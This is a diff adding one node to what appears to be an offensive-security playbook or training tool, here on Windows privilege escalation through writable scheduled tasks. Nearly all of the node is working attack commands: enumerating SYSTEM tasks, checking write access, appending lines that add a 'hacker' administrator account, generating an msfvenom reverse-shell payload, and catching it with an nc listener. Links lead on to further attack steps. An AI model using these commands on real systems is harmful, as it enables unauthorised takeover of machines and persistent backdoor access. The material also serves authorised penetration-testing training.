@@ -1,0 +1,18 @@
+{
+  "id": "scheduled_tasks_win",
+  "phase": "WINDOWS",
+  "title": "Scheduled Tasks Privesc",
+  "body": "Find scheduled tasks running as SYSTEM or high-priv user with a script/binary you can modify. Module 17.3: if you can write to the script being executed, you own the next run.",
+  "cmd": "# ── ENUMERATE SCHEDULED TASKS ────────────────────────\n# GUI: Task Scheduler\nschtasks /query /fo LIST /v\nschtasks /query /fo LIST /v | findstr /i \"task name\\|run as\\|task to run\\|status\"\n\n# PowerShell — cleaner output\nGet-ScheduledTask | Where-Object {$_.TaskPath -notlike \"*Microsoft*\"} | Select TaskName,TaskPath\nGet-ScheduledTask | Get-ScheduledTaskInfo | Select TaskName,LastRunTime,NextRunTime\n\n# ── FIND TASKS RUNNING AS SYSTEM ─────────────────────\nschtasks /query /fo LIST /v | findstr /i \"run as\"\n# Look for: Run As User: SYSTEM or Administrator\n\n# ── CHECK SCRIPT/BINARY PERMISSIONS ──────────────────\n# Get the script path from the task, then check perms\nicacls \"C:\\\\scripts\\\\cleanup.ps1\"\n# If you have (W) write access = replace it\n\n# ── REPLACE SCRIPT CONTENT ───────────────────────────\n# Append to the script (safer than replacing)\necho \"net user hacker pass123! /add\" >> C:\\\\scripts\\\\cleanup.ps1\necho \"net localgroup administrators hacker /add\" >> C:\\\\scripts\\\\cleanup.ps1\n\n# Or replace entirely with reverse shell\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f exe -o task_payload.exe\n# Transfer and place where the task expects it\n\n# ── TRIGGER MANUALLY IF POSSIBLE ────────────────────\nschtasks /run /tn \"TaskName\"\n\n# ── WAIT FOR SCHEDULED RUN ───────────────────────────\n# Check next run time:\nschtasks /query /tn \"TaskName\" /fo LIST /v | findstr \"Next Run\"\n# Set up listener before the scheduled time\nnc -nlvp 443",
+  "warn": null,
+  "choices": [
+    {
+      "label": "Got shell from task execution",
+      "next": "got_root_windows"
+    },
+    {
+      "label": "Cannot write to script/binary",
+      "next": "weak_service"
+    }
+  ]
+}
